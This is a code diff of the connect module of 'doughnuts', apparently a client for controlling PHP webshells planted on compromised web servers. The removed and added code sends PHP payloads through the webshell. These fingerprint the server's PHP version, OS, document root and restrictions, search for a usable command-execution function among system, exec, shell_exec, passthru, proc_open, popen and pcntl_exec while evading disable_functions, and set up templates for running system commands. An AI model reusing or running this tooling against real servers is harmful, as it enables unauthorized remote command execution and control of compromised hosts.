@@ -6,6 +6,7 @@ from urllib.parse import urlparse, unquote_plus
 from libs.config import alias, color, gget, gset, set_namespace
 from libs.app import value_translation
 from libs.myapp import base64_encode, is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt, get_ini_value_code
+from libs.functions.main_plugins.connect import *
 
 """
 url ['webshell']
@@ -25,20 +26,6 @@ webshell.iswin ['webshell'] Whether is windows
 webshell.upload_tmp_dir ['webshell']
 webshell.from_log ['webshell'] Whether connect from log
 """
-
-
-def get_detectd_exec_php():
-    return """$a=array('system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen','pcntl_exec');
-if(!function_exists('get_ini_value')) {
-    %s
-}
-$disabled = explode(',', get_ini_value('disable_functions'));
-foreach ($a as $v){
-    if (function_exists($v) && !in_array($v, $disabled)){
-        echo $v;
-        break;
-    }
-}""" % (get_ini_value_code())
 
 
 @alias(True, "c", u="url", m="method", p="pwd")
@@ -126,86 +113,111 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         string=ascii_letters + digits, offset=randint(32, 62))
     verify_string = randstr(ascii_letters)
 
-    res = send(
-        """
-function magic_callback($func_name) {
-    @$r=$func_name();
-    if(empty($r)){return "Unknown";}
-    return $r;
-}
-print("%s"."|".magic_callback('phpversion')."|"."%s"."|".@base64_decode("%s"));
-""" % (version_flag_start, version_flag_end, base64_encode(verify_string)), raw=True)
+    res = send(get_php_version( version_flag_start, version_flag_end, base64_encode(verify_string)),raw = True)
+
     if (not res or version_flag_start not in res.r_text):
         print(color.red("Connect failed..."))
         if (res):
             print(res.r_text)
         return False
+
+    # 判断版本
     if ('7.' in res.r_text or "Unknown" in res.r_text):
         gset("webshell.v7", True, namespace="webshell")
+
+    # 判断base64函数是否可用
     if verify_string not in res.r_text:
         gset("webshell.disable_base64_decode", True, namespace="webshell")
+        gset("webshell.base64_en_func", "b64e", namespace="webshell")
+        gset("webshell.base64_de_func", "b64d",namespace = "webshell")
 
     if version_flag_start in res.r_text:  # 验证是否成功连接
-        gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[
-             1].split("|" + version_flag_end)[0], namespace="webshell")
-        info_req = send(
-            """
-%s
-function magic_callback($func_name) {
-    @$r=$func_name();
-    if(empty($r)){return "Unknown";}
-    return $r;
-}
-
-$bit=PHP_INT_SIZE==4?32:64;
-print($_SERVER['DOCUMENT_ROOT'].'|'.magic_callback('php_uname').'|'.$_SERVER['SERVER_SOFTWARE'].'|'.magic_callback('getcwd').'|'.magic_callback('sys_get_temp_dir').'|'.get_ini_value('disable_functions').'|'.get_ini_value('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip() % (get_ini_value_code())
-        )
+        gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[1].split("|" + version_flag_end)[0], namespace="webshell")
+        # 获取总体信息
+        info_req = send(get_php_uname(get_ini_value_code()))
         info = info_req.r_text.strip().split("|")
-        exec_func = send(get_detectd_exec_php()).r_text.strip()
-        prepare_system_template(exec_func)
+
+        # web根目录
         gset("webshell.root", info[0], namespace="webshell")
-        gset(
-            "webshell.iswin",
-            (True if "win" in info[1].lower() else False),
-            namespace="webshell",
-        )
+
+        # 是否为windows
+        gset("webshell.iswin",(True if "win" in info[1].lower() else False),namespace="webshell",)
+
+        # 服务器版本
         gset("webshell.server_version", info[2], namespace="webshell")
+
+        # 当前目录
         gset("webshell.pwd", info[3], namespace="webshell")
+
+        # webshell所在目录
         gset("webshell.webshell_root", info[3], namespace="webshell")
-        gset("webshell.prompt",
-             f"doughnuts ({color.cyan(webshell_netloc)}) > ")
+
+        # 标识符
+        gset("webshell.prompt",f"doughnuts ({color.cyan(webshell_netloc)}) > ")
+
+        # 初始化执行系统命令模板
+        exec_func = send(get_php_detectd_exec(get_ini_value_code())).r_text.strip()
+        prepare_system_template(exec_func)
         gset("webshell.exec_func", exec_func, namespace="webshell")
+
+        # 设置文件上传目录
         upload_tmp_dir = info[4]
         if (not upload_tmp_dir):
             if (not is_windows()):
                 upload_tmp_dir = "/tmp/"
+            else:
+                upload_tmp_dir = "C:\\Windows\\Temp"
         else:
             if (is_windows()):
-                upload_tmp_dir += "\\\\"
+                upload_tmp_dir += "\\Temp\\"
             else:
                 upload_tmp_dir += "/"
         gset("webshell.upload_tmp_dir", upload_tmp_dir, namespace="webshell")
-        disable_function_list = [f.strip() for f in info[5].split(",")]
-        if ('' in disable_function_list):
-            disable_function_list.remove('')
-        gset("webshell.obd", info[6], namespace="webshell")
-        bits = info[7]
 
+        # open_basedir
+        gset("webshell.obd", info[6], namespace="webshell")
+
+        # 系统位数
+        bits = info[7]
         try:
             bits = int(bits)
         except ValueError:
             bits = 0
             print(color.yellow("detect architecture error\n"))
-        gset("webshell.os_version", info[1] +
-             " (%d bits)" % bits, namespace="webshell")
+
+        # 系统版本
+        gset("webshell.os_version", info[1] +" (%d bits)" % bits, namespace="webshell")
+
+        # 系统架构
         gset("webshell.arch", bits, namespace="webshell")
 
+        # 分隔符
         info[8] = info[8] if info[8] else "/"
         gset("webshell.directory_separator", info[8], namespace="webshell")
-        gset("webshell.disable_functions",
-             disable_function_list, namespace="webshell")
+
+        # disable_functions
+        disable_function_list = [f.strip() for f in info[5].split(",")]
+        if ('' in disable_function_list):
+            disable_function_list.remove('')
+        gset("webshell.disable_functions", disable_function_list, namespace="webshell")
+
+        # disable_classes
+        disable_classes_list = [f.strip() for f in info[9].split(",")]
+        if ('' in disable_classes_list):
+            disable_classes_list.remove('')
+        gset("webshell.disable_classes", disable_classes_list, namespace="webshell")
+
         root_path = gget("root_path")
         from_log = gget("webshell.from_log", "webshell")
+
+        # 获取扩展信息
+        info_req = send(get_php_loaded_extensions())
+        info = info_req.r_text.strip().split("|")
+
+        if info[0] == "Unknown":
+            gset("webshell.loaded_ext", False, namespace="webshell")
+        else:
+            gset("webshell.loaded_ext", info, namespace="webshell")
 
         if not from_log:
             extra = "|".join(encoders_or_params) + \
